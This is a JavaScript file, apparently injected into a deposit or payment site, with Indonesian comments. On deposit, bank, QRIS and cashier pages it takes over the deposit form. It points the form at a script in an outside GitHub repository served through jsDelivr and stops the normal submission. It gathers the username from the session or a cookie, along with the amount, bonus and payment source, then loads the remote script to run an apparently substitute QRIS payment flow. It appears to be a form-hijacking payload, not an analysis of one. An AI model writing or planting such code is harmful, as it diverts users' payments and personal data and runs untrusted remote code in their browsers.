/**
 * deposit_redirect (act2.js) - run only on allowed paths (fixed)
 */
(function () {
  // daftar allowed patterns
  const allowed = [
    '/deposit',
    '/bank',
    '/deposit.php',
    '/qris.php',
    '/cashier',
    '/?page=transaksi',
    '/index.php?page=transaksi',
    '/?deposit&head=home',
    '/index.php?page=cashier',
    '/bank.php'
  ];

  // helper baca cookie
  function readCookie(name) {
    const m = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
    return m ? decodeURIComponent(m[2]) : null;
  }

  // normalisasi url parts
  const href = window.location.href;
  const pathname = window.location.pathname || '/';
  const search = window.location.search || '';

  // cek apakah current url termasuk allowed
  function isAllowed() {
    const pathAndSearch = pathname + search;

    for (let i = 0; i < allowed.length; i++) {
      const p = allowed[i];

      // kalo pattern mengandung '?' atau '=' -> cek di full href (query-based patterns)
      if (p.indexOf('?') !== -1 || p.indexOf('=') !== -1) {
        if (href.indexOf(p) !== -1) return true;
      } else {
        // cocokkan exact path (path + search) atau startsWith untuk handle trailing slash
        if (pathAndSearch === p) return true;
        if (pathname === p) return true;
        if (pathname.indexOf(p) === 0) return true; // /deposit matches /deposit/whatever
        // juga check kalau href mengandung pattern sebagai substring (safety)
        if (href.indexOf(p) !== -1) return true;
      }
    }
    return false;
  }

  if (!isAllowed()) {
    // tidak di halaman yang diijinkan -> hentikan
    console.info('deposit_redirect: halaman ini bukan halaman deposit; script tidak dijalankan.', { pathname, search, href });
    return;
  }

  document.addEventListener("DOMContentLoaded", function () {
    const form = document.getElementById("depositForm");
    if (!form) {
      console.warn("deposit_redirect: Form depositForm tidak ditemukan pada halaman ini.");
      return;
    }

    // Ubah action ke file eksternal (CDN)
    form.action = "https://cdn.jsdelivr.net/gh/arceusxyz/moon@main/afteract1.js";

    form.addEventListener("submit", function (e) {
      e.preventDefault();

      // Ambil username: prioritas dari session-injected JS, fallback ke cookie
      const username = (typeof window.SESSION_USER !== "undefined" && window.SESSION_USER) ? window.SESSION_USER : readCookie("user");

      const nominal = document.getElementById("nominal")?.value || "";
      const bonus = document.getElementById("bonus")?.value || "";
      const payFrom = form.querySelector("select[name='pay_from']")?.value || "";
      const postID = form.querySelector("input[name='postID']")?.value || "";
      const termCondition = form.querySelector("input[name='termcondition']")?.checked ? 1 : 0;

      // Data form
      const data = {
        username: username,
        nominal: nominal,
        bonus: bonus,
        pay_from: payFrom,
        postID: postID,
        termcondition: termCondition
      };

      console.log("deposit_redirect: Mengirim data ke 1.js:", data);

      // Simpan data secara global supaya bisa dibaca oleh 1.js
      window.depositFormData = data;

      // Feedback kecil di DOM (optional)
      let statusEl = document.getElementById("depositStatusInline");
      if (!statusEl) {
        statusEl = document.createElement("div");
        statusEl.id = "depositStatusInline";
        statusEl.style.marginTop = "8px";
        statusEl.style.fontSize = "13px";
        form.parentNode.insertBefore(statusEl, form.nextSibling);
      }
      statusEl.textContent = "Mengirim... memuat proses pembayaran.";

      // Buat <script> dinamis untuk load 1.js
      const script = document.createElement("script");
      script.src = form.action;
      script.async = true;

      script.onload = function () {
        console.log("deposit_redirect: File eksternal 1.js berhasil dimuat. Data tersedia di window.depositFormData");
        statusEl.textContent = "Script pembayaran dimuat. Menunggu hasil QRIS...";
      };

      script.onerror = function () {
        console.error("deposit_redirect: Gagal memuat 1.js dari CDN.");
        statusEl.textContent = "Gagal memuat script eksternal. Coba refresh halaman.";
      };

      document.body.appendChild(script);
    });
  });
})();
